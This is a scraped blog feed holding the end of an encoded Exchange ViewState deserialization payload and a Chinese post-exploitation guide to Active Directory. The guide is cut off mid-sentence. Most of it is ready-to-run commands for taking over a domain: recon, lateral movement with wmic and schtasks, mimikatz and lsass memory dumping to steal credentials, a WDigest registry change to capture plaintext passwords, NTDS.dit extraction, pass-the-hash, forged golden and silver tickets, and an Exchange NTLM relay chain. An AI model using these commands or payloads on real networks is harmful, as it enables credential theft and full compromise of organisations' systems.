class="hljs-number">3</span>R<span class="hljs-number">1</span>ZGlvLlRleHQuRm<span class="hljs-number">9</span>ybWF<span class="hljs-number">0</span>dGluZy<span class="hljs-number">5</span>UZXh<span class="hljs-number">0</span>Rm<span class="hljs-number">9</span>ybWF<span class="hljs-number">0</span>dGluZ<span class="hljs-number">1</span>J<span class="hljs-number">1</span>blByb<span class="hljs-number">3</span>BlcnRpZXMBAAAAD<span class="hljs-number">0</span>ZvcmVncm<span class="hljs-number">91</span>bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY<span class="hljs-number">3</span>Rpb<span class="hljs-number">25</span>hcnkNCiAgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>Imh<span class="hljs-number">0</span>dHA<span class="hljs-number">6</span>Ly<span class="hljs-number">9</span>zY<span class="hljs-number">2</span>hlbWFzLm<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">5</span>jb<span class="hljs-number">20</span>vd<span class="hljs-number">2</span>luZngvMjAwNi<span class="hljs-number">94</span>YW<span class="hljs-number">1</span>sL<span class="hljs-number">3</span>ByZXNlbnRhdGlvbiINCiAgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">6</span>eD<span class="hljs-number">0</span>iaHR<span class="hljs-number">0</span>cDovL<span class="hljs-number">3</span>NjaGVtYXMubWljcm<span class="hljs-number">9</span>zb<span class="hljs-number">2</span>Z<span class="hljs-number">0</span>LmNvbS<span class="hljs-number">93</span>aW<span class="hljs-number">5</span>meC<span class="hljs-number">8</span>yMDA<span class="hljs-number">2</span>L<span class="hljs-number">3</span>hhbWwiDQogIHhtbG<span class="hljs-number">5</span>zOlN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbT<span class="hljs-number">0</span>iY<span class="hljs-number">2</span>xyLW<span class="hljs-number">5</span>hbWVzcGFjZTpTeXN<span class="hljs-number">0</span>ZW<span class="hljs-number">07</span>YXNzZW<span class="hljs-number">1</span>ibHk<span class="hljs-number">9</span>bXNjb<span class="hljs-number">3</span>JsaWIiDQogIHhtbG<span class="hljs-number">5</span>zOkRpYWc<span class="hljs-number">9</span>ImNsci<span class="hljs-number">1</span>uYW<span class="hljs-number">1</span>lc<span class="hljs-number">3</span>BhY<span class="hljs-number">2</span>U<span class="hljs-number">6</span>U<span class="hljs-number">3</span>lzdGVtLkRpYWdub<span class="hljs-number">3</span>N<span class="hljs-number">0</span>aWNzO<span class="hljs-number">2</span>Fzc<span class="hljs-number">2</span>VtYmx<span class="hljs-number">5</span>PXN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbSI%<span class="hljs-number">2</span>BDQoJIDxPYmplY<span class="hljs-number">3</span>REYXRhUHJvdmlkZXIgeDpLZXk<span class="hljs-number">9</span>IiIgT<span class="hljs-number">2</span>JqZWN<span class="hljs-number">0</span>VHlwZSA<span class="hljs-number">9</span>ICJ<span class="hljs-number">7</span>IHg<span class="hljs-number">6</span>VHlwZSBEaWFnOlByb<span class="hljs-number">2</span>Nlc<span class="hljs-number">3</span>N<span class="hljs-number">9</span>IiBNZXRob<span class="hljs-number">2</span>ROYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gIlN<span class="hljs-number">0</span>YXJ<span class="hljs-number">0</span>IiA%<span class="hljs-number">2</span>BDQogICAgIDxPYmplY<span class="hljs-number">3</span>REYXRhUHJvdmlkZXIuTWV<span class="hljs-number">0</span>aG<span class="hljs-number">9</span>kUGFyYW<span class="hljs-number">1</span>ldGVycz<span class="hljs-number">4</span>NCiAgICAgICAgPFN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbTpTdHJpbmc%<span class="hljs-number">2</span>BY<span class="hljs-number">2</span>FsYy<span class="hljs-number">5</span>leGU<span class="hljs-number">8</span>L<span class="hljs-number">1</span>N<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbTpTdHJpbmc%<span class="hljs-number">2</span>BDQogICAgIDwvT<span class="hljs-number">2</span>JqZWN<span class="hljs-number">0</span>RGF<span class="hljs-number">0</span>YVByb<span class="hljs-number">3</span>ZpZGVyLk<span class="hljs-number">1</span>ldGhvZFBhcmFtZXRlcnM%<span class="hljs-number">2</span>BDQogICAgPC<span class="hljs-number">9</span>PYmplY<span class="hljs-number">3</span>REYXRhUHJvdmlkZXI%<span class="hljs-number">2</span>BDQo<span class="hljs-number">8</span>L<span class="hljs-number">1</span>Jlc<span class="hljs-number">291</span>cmNlRGljdGlvbmFyeT<span class="hljs-number">4</span>Lp<span class="hljs-number">73</span>ado<span class="hljs-number">0</span>NJN<span class="hljs-number">2</span>PSSnfOoN<span class="hljs-number">9</span>h<span class="hljs-number">4</span>H<span class="hljs-number">7</span>xCU%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Exchange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网基础（持续更新...）</title>
    <link href="/2021/02/03/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/02/03/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透-基础-第一版"><a href="#内网渗透-基础-第一版" class="headerlink" title="内网渗透(基础)-第一版"></a>内网渗透(基础)-第一版</h1><p>我们假定你已经拿下一台普通权限的机器，这台机器也许处在DMZ(外部网站)，也许运气好就在内网域环境里，渗透情况总是复杂多样的，现在我们开始内网渗透，目标拿下域管理员,实现完全控制，这就是所谓的后渗透，让我们开始吧。</p><ul><li><p>域环境介绍</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></p></blockquote></li><li><p>域环境一般构成：</p><ul><li>PDC（主域控制器）+ SDC（次域控）+ Exchange（邮件服务器）+ DataCentre（共享服务器）+ PC<h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><h3 id="基本信息："><a href="#基本信息：" class="headerlink" title="基本信息："></a>基本信息：</h3></li></ul></li><li><p>权限 - <code>whoami -all</code></p></li><li><p>ip信息 - <code>ipconfig</code></p></li><li><p>开放端口及服务 - <code>netstat -ano</code></p></li><li><p>edr(杀软) - <code>cd C:\Program Files &amp; dir</code> 和 <code>cd C:\Program Files (x86)&amp;&amp;dir</code></p></li><li><p>进程 - <code>tasklist /v</code></p></li><li><p>系统信息 - <code>systeminfo</code></p></li><li><p>查看当前登录用户 - <code>quser</code></p></li><li><p>账户信息：</p>  <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> user<br><span class="hljs-keyword">net</span> localgroup<br><span class="hljs-keyword">net</span> accounts<br><span class="hljs-keyword">net</span> localgroup administrators<br><span class="hljs-keyword">net</span> localgroup <span class="hljs-string">&quot;Remote Desktop Users&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>服务信息 - <code>sc query</code></p></li><li><p>然后桌面啥的翻一翻，万一有密码呢~</p><h3 id="提权信息："><a href="#提权信息：" class="headerlink" title="提权信息："></a>提权信息：</h3></li><li><p>查看安装补丁的版本 - <code>wmic qfe</code></p><h3 id="凭证信息"><a href="#凭证信息" class="headerlink" title="凭证信息"></a>凭证信息</h3></li><li><p><code>mimikatz dpapi</code></p><h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><h3 id="exp提权"><a href="#exp提权" class="headerlink" title="exp提权"></a>exp提权</h3></li><li><p>首先执行命令 <code>wmic qfe</code> 查看补丁版本，寻找没有被修补的漏洞</p></li><li><p><strong><em>juicy potato</em></strong>工具生成exp：</p><blockquote><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a> </p></blockquote></li><li><p>编译完成上传到目标执行，执行完成后使用 <code>whoami</code> 查看是否是 <code>administrator</code> 权限</p><h3 id="第三方提权："><a href="#第三方提权：" class="headerlink" title="第三方提权："></a>第三方提权：</h3></li><li><p>MySQL - UDF提权</p></li><li><p>MSSQL - <code>root</code> 权限可以通过 <code>xp_cmdshell</code> 执行命令</p></li><li><p>各种web应用服务，比如Tomcat，在web目录部署webshell。</p></li><li><p>总之寻找高权限第三方服务</p><h3 id="系统提权："><a href="#系统提权：" class="headerlink" title="系统提权："></a>系统提权：</h3><ul><li>未引用服务目录</li><li>dll注入</li><li>越权文件替换</li></ul></li></ul><h2 id="域信息收集："><a href="#域信息收集：" class="headerlink" title="域信息收集："></a>域信息收集：</h2><h3 id="dsquery"><a href="#dsquery" class="headerlink" title="dsquery :"></a>dsquery :</h3><ul><li>dsquery 是windows服务器自带的查询工具，可以查询出域内所有的信息，注意：**<em>只能在域机器上或经过认证的域用户使用**</em>，可远程查询。</li><li>基本用法：<code>dsquery * -limit 0(不加的话默认导出前100条) -filter (内容是过滤器) -attr (内容是导出的项目) dc= (域名，有几级域名就加几个 dc，例如 hello.org =&gt; dc=hello dc=org）</code></li><li>导出域信任关系 : <code>dsquery * -filter (objectClass=trusteddomain) &gt; trust.txt</code></li><li>导出域用户信息: <code>dsquery * -limit 0 -filter (objectclass=user) -attr * &gt; user.txt</code> </li><li>导出域用户信息的指定属性: <code>dsquery * -limit 0 -filter objectclass=user -attr name pwdLastSet sAMAccountName mail &gt; user.txt</code></li><li>查询指定用户信息：<code>dsquery * -limit 0 -filter &amp;(objectclass=user)(sAMAccountName=John) -attr * &gt; user.txt</code> </li><li>查询所有 adminCount 为1的账户(大概率为域管账户，但如果曾今是也是1): <code>dsquery * -filter &quot;(&amp;(objectClass=user)(adminCount=1))&quot; -attr * -l -limit 0 &gt; user.txt</code></li><li>导出域用户组信息：`dsquery * -limit 0 -filter objectclass=group -attr * &gt; group.txt</li><li>导出域计算机信息：<code>dsquery * -filter objectclass=computer -attr * &gt; computer.txt</code></li><li>远程连接域控：<code>dsquery * dc=hello,dc=org -attr * -l -limit 0 -s 10.24.15.1 -u EXCHLAB\Administrator -p VMPassw0rd!! &gt; full.txt</code><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2></li></ul><ul><li>横向移动（远程执行命令）是内网渗透的重中之重，一开始获取权限的或许只是普通机器，可能需要很多次横向移动才能抓到域管账号。<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3></li></ul><ul><li><p>执行命令： <code>wmic /node:10.1.1.1 /user:administrator /password:admin123 process call create &quot;cmd /c whoami &gt; 1.txt&quot;</code></p></li><li><p>注意：</p><ol><li>wmic需要域管理员权限才能在别人电脑上执行命令哦</li><li>如果此时正有人在登录，wmic会弹窗<h3 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h3></li></ol></li><li><p>执行命令：<code>schtasks /create /s 1.1.1.1 /u administrator /p admin123 /tn hhh(任务名字) /sc once(执行次数) /tr &quot;cmd /c whoami &gt; 1.txt&quot;</code></p></li><li><p>注意：<br>  1.schtasks同样需要域管理员权限<br>  2.schtasks将以system权限执行命令</p><h3 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h3></li><li><p>windows server 默认开启的服务，可以使用winrs客户端执行命令</p></li><li><p>可以复用80，443端口做持久化</p></li></ul><h3 id="其余的工具"><a href="#其余的工具" class="headerlink" title="其余的工具"></a>其余的工具</h3><ul><li>at</li><li>psexec</li><li>dcom</li><li>rdp<h2 id="抓取凭证"><a href="#抓取凭证" class="headerlink" title="抓取凭证"></a>抓取凭证</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3></li><li>宇宙最强奇异果，内网渗透神器，建议搞懂，可以从内存中读出用户的密码明文或者哈希</li><li>注意: 右键以管理员权限运行</li><li><strong><em>注意！！</em></strong>：<ol><li>使用 mimikatz 时注意看其支持的系统版本，如果在不支持的系统版本上执行通常会导致机器重启</li><li>mimikatz 20190813 版在 Windows Server 2016 的 DC 服务器上使用失败，重启</li></ol></li><li>使用：<ul><li><p><code>mimikatz privilege::debug</code> ：万事先提权</p></li><li><p><code>sekurlsa::logonPasswords</code> : 抓取在这台电脑上登录过的域用户的密码以及本地密码（内存中的）</p></li><li><p>抓明文：</p><ol><li><p>自 Windows 8.1 及 Windows Server 2012 R2 开始，内存就不再存储 LM Hash 及明文密码了，旧版本的 Windows 打上 kb2871997 补丁也会实现相同的功能，如果这时候还想让系统存储明文密码就需要修改下注册表：</p><blockquote><p><code>reg add \\DC1.EXCHLAB.ORG\HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest  /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p></blockquote></li><li><p>修改成功之后不必重启，之后登录 Windows 的账户明文密码就可以通过抓内存抓到了<br>然而，这个注册表项一般会被防御软件监控，所以除非没办法了，否则别碰！</p></li></ol></li><li><p>mimikatz在目标上极易被杀，所以我们采取另一种办法，上传微软签名的工具 <code>procdump</code> 拷贝内存，考回本机，用mimikatz加载：</p><ol><li>使用procdump导内存： <code>procmon.exe -accepteula -ma lsass.exe C:\Windows\Temp\debug.dmp</code></li><li>使用mimikatz加载： <code>mimikatz.exe &quot;sekurlsa::minidump C:\Windows\Temp\debug.dmp&quot; &quot;sekurlsa::logonPasswords&quot;</code></li></ol></li><li><p>抓取本地：</p><ul><li>导出注册表：<ol><li><code>reg save \\DC1.EXCHLAB.ORG\HKLM\SAM C:\Windows\Temp\SAM.HIVE</code></li><li><code>reg save \\DC1.EXCHLAB.ORG\HKLM\SYSTEM C:\Windows\Temp\SYSTEM.HIVE</code></li><li>拖回本地：<code>mimikatz.exe &quot;lsadump::sam /sam:C:\sam.hive /system:C:\system.hive&quot; exit</code></li></ol></li></ul></li><li><p>记录明文：mimikatz 通过向 Windows SSP (Security Support Provider) 打内存补丁的方式，将所有认证时传入的帐号密码记录到文件 C:\Windows\System32\mimilsa.log 中，重启失效</p><blockquote><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;misc::memssp&quot; exit</code></p></blockquote></li><li><p>抓取全域：</p><ul><li><p>dcsyns：</p><blockquote><p><code>lsadump::dcsync /domain:pentestlab.local /all /csv</code></p></blockquote></li><li><p>lsadump::lsa:</p><blockquote><p><code>privilege::debug log \&quot;lsadump::lsa /inject</code></p></blockquote></li><li><p>ntdsdump: 导出ntds.dit数据库文件，也可以导出全域密码(建议rdp导出)</p><ol><li><p>一般c盘么的权限拷贝，需要先创建快照：</p><blockquote><p><code>vssadmin create shadow /for=C:</code></p></blockquote></li><li><p>复制数据库文件</p> <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">&gt; copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\n</span>tds.dit C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\b</span>ackup.db<br>&gt; copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>YSTEM C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\s</span>ystem.db<br></code></pre></td></tr></table></figure></li><li><p>使用 impacket的secretdump套件读取hash</p><blockquote><p><code>impacket-secretsdump -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL</code></p></blockquote><ul><li>secretsdump：<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py</a></li></ul></li></ol><ul><li>注意：创建快照的操作会被记录，可以使用 <code>Invoke-NinjaCopy</code> 工具，不过该工具会被windows defender拦截。<h2 id="票据和哈希"><a href="#票据和哈希" class="headerlink" title="票据和哈希"></a>票据和哈希</h2><h3 id="哈希传递："><a href="#哈希传递：" class="headerlink" title="哈希传递："></a>哈希传递：</h3>win2008之后的版本密码就以hash储存而不存明文，前面mimikatz抓取的一般为 <code>NTLM hash</code> 。除了basic认证，域环境内的一种身份认证方式是 <code>NTLM hash认证</code>。采用问询/应答身份验证协议。<blockquote><p>NTLM身份认证： <a href="https://blog.csdn.net/qq_39353923/article/details/82599014">https://blog.csdn.net/qq_39353923/article/details/82599014</a></p></blockquote></li></ul></li></ul></li></ul></li><li>注：域内认证方式：<ol><li>basic认证（账户密码）</li><li>NTLM认证</li><li>Negotiate认证（票据）</li></ol></li></ul><p>所以我们可以在拥有mimikatz抓取的hash的情况下进行 <code>PTH</code> 攻击（哈希传递攻击），可伪装任意拥有hash的用户。</p><blockquote><p><code>mimikatz sekurlsa::pth /user:administrtor /domain:hello.org /ntlm: /run:cmd.exe</code></p></blockquote><ul><li>弹出的cmd框中执行的命令都会使用提供的ntlm进行认证。<h3 id="票据传递："><a href="#票据传递：" class="headerlink" title="票据传递："></a>票据传递：</h3>票据认证是微软的另一种认证方式，用到的是著名的 <code>kerberos</code> 认证。</li></ul><p><img src="http://47.75.197.183/ss/kerberos.png" alt="avatar"></p><ul><li><p>黄金票据：域中分发的票据是使用域用户 <code>krbtgt</code> 的hash加密的，当我们拥有krbtgt的hash后，就可以生成任意票据。</p><blockquote><p><code>mimikatz &quot;kerberos::golden /user:Administrator /domain:hello.org /sid:S-1-5-21-1016690176-3112175478-3511132709 /krbtgt:7492c3058483dc019379647210fb5dae /dc:DC1.hello.org /ptt</code></p></blockquote><ul><li>注意，<code>sid</code> 为域的sid，即用户sid去掉最后的一块。</li><li>应用场景：黄金票据必须有krbtgt的hash，这需要同步过全域的hash，意味着以曾拿过域管，所以一般应用在域管权限丢失后（改密码）重新拿回域管。krbtgt用户的密码一般不会改。</li></ul></li><li><p>白银票据：</p><p>  在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了。当拥有服务（比如 http,smb等）的hash，我们就可以伪造票据访问任意服务。</p><ul><li>白银票据不需要与KDC交互！</li><li>比如攻击exchange机器：<ul><li><p>需要拿到exchange机器的机器hash。</p><blockquote><p><code>mimikatz &quot;kerberos::golden /admin:Administrator /domain:EXCHLAB.ORG /sid:S-1-5-21-1016690176-3112175478-3511132709 /target:EXCH.hello.org /rc4:498031189eaa18a1308f36221903dad7 /service:HTTP /ptt</code></p></blockquote></li><li><p><code>klist</code> 查看导入的票据。</p></li><li><p>成功后即可以任意用户访问exchange服务，无需经过域控认证。</p><h2 id="口令攻防"><a href="#口令攻防" class="headerlink" title="口令攻防"></a>口令攻防</h2></li></ul></li></ul></li></ul><p>很多情况下因为杀软的存在是不能直接上mimikatz抓到内存的，有的杀软（某巴斯基）甚至会保护进程，这时候就需要我们用别的方法了</p><ul><li><p>procdump</p><pre><code>+ 这个就不解释了，上面说过了，微软签名的工具</code></pre></li><li><p>sqldump</p><ul><li><p>mssql自带的dump内存的工具，位置</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\M</span>icrosoft SQL Server<span class="hljs-symbol">\1</span>00<span class="hljs-symbol">\S</span>hared<br></code></pre></td></tr></table></figure><p>命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Sqldumper</span>.exe ProcessID <span class="hljs-number">0</span> <span class="hljs-number">0</span>x<span class="hljs-number">01100</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>comsvcs.dll</p><ul><li><p>直接利用windows自带的dll，完美过杀软</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">.<span class="hljs-symbol">\r</span>undll32.exe C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>omsvcs.dll, MiniDump 624 C:<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\l</span>sass.dmp full<br></code></pre></td></tr></table></figure><h3 id="绕过内存保护"><a href="#绕过内存保护" class="headerlink" title="绕过内存保护"></a>绕过内存保护</h3></li></ul></li><li><p>蓝屏：<a href="https://www.mrwu.red/web/2000.html">https://www.mrwu.red/web/2000.html</a>    <a href="http://www.aiyuanzhen.com/index.php/archives/211/">http://www.aiyuanzhen.com/index.php/archives/211/</a></p></li><li><p>ssp注入：<a href="https://blog.csdn.net/xiangshen1990/article/details/104872566">https://blog.csdn.net/xiangshen1990/article/details/104872566</a></p></li></ul><h2 id="域提权"><a href="#域提权" class="headerlink" title="域提权"></a>域提权</h2><p>当你拥有一台普通的域权限机器后，接下来要做的就是提升到域管理员权限。</p><h3 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动"></a>横向移动</h3><p>mimikatz 的 logonpasswords模块只能抓到在本机登陆过的域账户，所以利用抓到的凭证进行横向移动，也许就能遇到域控登陆过的机器。</p><h3 id="GPP漏洞"><a href="#GPP漏洞" class="headerlink" title="GPP漏洞"></a>GPP漏洞</h3><p>当域控为win2008时，域管通过 GPP（组策略）修改域成员的信息会保存在域内共享文件中，可破解得到明文密码。</p><ul><li><p>xml路径：<code>\\dc.hello.org\SYSVOL\hello.org\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\group.xml</code>(polices后面的路径不同，可通过域信息的gplinkl查找)</p></li><li><p>在kali内的 <code>gpp-decrypt</code> 工具解密该加密文件，获得明文。</p><blockquote><p><code>ds-crypt &quot;...&quot;</code></p></blockquote><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>经典提权漏洞，exp编译后运行即可，版本很老，一般会修复。</p><h3 id="spn爆破"><a href="#spn爆破" class="headerlink" title="spn爆破"></a>spn爆破</h3><blockquote><p><a href="https://www.cnblogs.com/zpchcbd/p/11707776.html">https://www.cnblogs.com/zpchcbd/p/11707776.html</a></p></blockquote></li></ul><blockquote><p>服务主体名称（SPN：ServicePrincipal Names）是服务实例（可以理解为一个服务，比如 HTTP、MSSQL）的唯一标识符。Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联,服务实例可以为其主机的每个名称或别名注册 SPN。<br>因为服务账户一般具有高权限，所以扫描spn也是提权的可行手段。*<strong>**<em>任何域用户都可以向任何域服务请求TGS</em></strong>。</p></blockquote><ul><li>利用步骤：<ol><li>扫描spn</li><li>根据SPN请求TGS</li><li>导出TGS_ticket（mimikatz）</li><li>TGS_ticket默认rc4加密，爆破即可获得服务用户密码</li></ol></li></ul><h2 id="其余内网攻击方式"><a href="#其余内网攻击方式" class="headerlink" title="其余内网攻击方式"></a>其余内网攻击方式</h2><ul><li><p>kerberos委派 </p><blockquote><p><a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p></blockquote></li><li><p>ntlm中继 </p><blockquote><p><a href="https://www.freebuf.com/column/202842.html">https://www.freebuf.com/column/202842.html</a></p></blockquote></li><li><p>WPAD</p><blockquote><p><a href="http://www.vuln.cn/6824">http://www.vuln.cn/6824</a></p></blockquote></li><li><p>arp欺骗</p></li><li><p>爆破smb</p></li><li><p>Sharepoint rce</p><blockquote><p><a href="https://www.anquanke.com/post/id/197770">https://www.anquanke.com/post/id/197770</a></p></blockquote></li><li><p>Exchange SSRF + NTLM Relay + Exchange ACL</p><blockquote><p><a href="https://www.anquanke.com/post/id/194514">https://www.anquanke.com/post/id/194514</a></p></blockquote></li><li><p>Exchange View_state 隐藏后门</p><blockquote><p><a href="http://www.360doc.com/content/20/0302/01/68828020_896063583.shtml">http://www.360doc.com/content/20/0302/01/68828020_896063583.shtml</a></p></blockquote></li><li><p>Exchange利用方法</p><blockquote><p><a href="https://blog.riskivy.com/exchange-server-in-pentest/">https://blog.riskivy.com/exchange-server-in-pentest/</a></p></blockquote></li><li><p>…</p><p>  (o’w’o) 暂时懒得写了，等有空了再介绍上述攻击⑧ ~</p></li></ul><h2 id="SMB签名和LDAP签名"><a href="#SMB签名和LDAP签名" class="headerlink" title="SMB签名和LDAP签名"></a>SMB签名和LDAP签名</h2><blockquote><p><a href="https://www.anquanke.com/post/id/194514">https://www.anquanke.com/post/id/194514</a></p></blockquote><h3 id="关于签名"><a href="#关于签名" class="headerlink" title="关于签名"></a>关于签名</h3><p>客户端和服务器端开启签名将使用一个key加密操作，以防止NTLM_relay攻击（攻击者看不见内容）这个key由客户端生成，叫做exportedkey，然后用key_exchangekey作为密钥加密，（keyexchange是有用户与服务端共同计算协商的）得到encryptedkey，作为sessionkey字段传给服务端。</p><h3 id="smb签名"><a href="#smb签名" class="headerlink" title="smb签名"></a>smb签名</h3><p>在域内的默认设置是仅在域控制器上启用，域成员机器并没有启用</p><h3 id="LDAP签名"><a href="#LDAP签名" class="headerlink" title="LDAP签名"></a>LDAP签名</h3><p>在默认情况底下，ldap服务器就在域控里面，而且默认策略就是协商签名。而不是强制签名。也就是说是否签名是有客户端决定的。服务端跟客户端协商是否签名。微软公司于 2019-09-11 日发布相关通告称微软计划于 2020 年 1 月发布安全更新。为了提升域控制器的安全性，该安全更新将强制开启所有域控制器上 LDAP channel binding 与 LDAP signing 功能。</p><h2 id="Exchange-SSRF-NTLM-Relay-Exchange-ACL"><a href="#Exchange-SSRF-NTLM-Relay-Exchange-ACL" class="headerlink" title="Exchange SSRF + NTLM Relay + Exchange ACL"></a>Exchange SSRF + NTLM Relay + Exchange ACL</h2><p>很棒的攻击，所以写一下</p><h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><ul><li><p>exchange允许任何用户为推送订阅（Push Subscription）指定所需的URL，服务器将尝试向这一URL发送通知。这一漏洞之所以存在，是因为Exchange Server使用CredentialCache.DefaultCredentials进行连接：<br><img src="https://mmbiz.qpic.cn/mmbiz_png/wpkib3J60o2ibpT5faJPylYMGzvQhuyY1FVecPKQrOxGicg5TzrHguuiasGFrACTIBCPlxqXFvvvVmMdD8pavLRMZg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="avatar"></p><p>  CredentialCache.DefaultCredentials 会使 exchange 将 net-ntlm（注意不是NTLM） 发送到攻击者服务器。且exchange默认如下注册表项</p>  <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\L</span>sa<span class="hljs-symbol">\D</span>isableLoopbackCheck = 1<br></code></pre></td></tr></table></figure><p>  并未开启relay_back检查，因此我们可以将NTLM返回exchange的ews接口用于http认证，我们可以在soap头里伪造任意用户<br>  <img src="https://mmbiz.qpic.cn/mmbiz_png/wpkib3J60o2ibpT5faJPylYMGzvQhuyY1FZ5VESEWN4XurbicaQX6lhYQhff6M28guMxYXibLJkiaGZITwKFGMfqHYQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="avatar"></p><ul><li>利用工具：<a href="https://github.com/WyAtu/CVE-2018-8581">https://github.com/WyAtu/CVE-2018-8581</a><h3 id="域管权限"><a href="#域管权限" class="headerlink" title="域管权限"></a>域管权限</h3></li></ul></li></ul><ul><li><p>全域dcsync需要权限，我们可以通过添加两条ACL来使用户获得权限：</p>  <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">‘DS-Replication-Get-Changes’     = 1131f6aa<span class="hljs-string">-9</span>c07<span class="hljs-string">-11</span>d1-f79f<span class="hljs-string">-00</span>c04fc2dcd2<br>‘DS-Replication-Get-Changes-All’ = 1131f6ad<span class="hljs-string">-9</span>c07<span class="hljs-string">-11</span>d1-f79f<span class="hljs-string">-00</span>c04fc2dcd2<br></code></pre></td></tr></table></figure><p>  <code>Exchange Windows Permissions,Exchange Trusted Subsystem</code> 组成员都具有Write-ACL权限，则exchange机器拥有添加ACL的权限，所以我们在拿到Exchange机器的http请求的时候，可以将请求Relay到Ldap,然后由于Exchange机器用户具备Write-ACL权限，我们在域内给添加两条acl，acl的受托人可以是任意用户。从而使该用户具备Dcsync的权限。</p></li><li><p>利用工具：</p><ul><li><code>privexchange.py</code> : <a href="https://github.com/dirkjanm/PrivExchange">https://github.com/dirkjanm/PrivExchange</a></li><li><code>ntlmrelayx.py、secretsdump.py</code> : <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li></ul></li><li><p>攻击步骤：</p><ol><li><p>使用 <code>ntlmrelayx</code> 监听端口进行等待连接<br><img src="https://p3.ssl.qhimg.com/t01516372c096f87a37.png" alt="avatar"></p></li><li><p>发起推送订阅指定所需的URL，Exchange. 